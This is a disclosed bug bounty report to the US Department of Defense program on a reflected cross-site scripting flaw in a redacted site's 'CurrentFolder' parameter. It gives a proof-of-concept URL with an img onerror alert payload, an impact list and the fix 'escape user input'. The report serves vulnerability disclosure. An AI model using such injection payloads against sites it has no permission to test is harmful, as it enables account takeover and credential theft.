# [████████] RXSS via "CurrentFolder" parameter

## Report Details
- **Report ID**: 1624267
- **URL**: https://hackerone.com/reports/1624267
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-07-04T14:06:12.829Z
- **Disclosed**: 2023-12-21T17:36:10.446Z

## Reporter
- **Username**: qu1nten
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
The website █████ is vulnerable to reflected cross-site scripting via the `CurrentFolder` parameter.

## How to reproduce?

Visit: https://██████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain)%3EResources&ID=17263

███

## Resources:

https://portswigger.net/web-security/cross-site-scripting

## Impact

An attacker who exploits a cross-site scripting vulnerability is typically able to:

* Impersonate or masquerade as the victim user.
* Carry out any action that the user is able to perform.
* Read any data that the user is able to access.
* Capture the user's login credentials.
* Perform virtual defacement of the web site.
* Inject trojan functionality into the web site.

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Visit: https://██████████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain)%3EResources&ID=17263

## Suggested Mitigation/Remediation Actions
Escape user input



## Attachments
No attachments
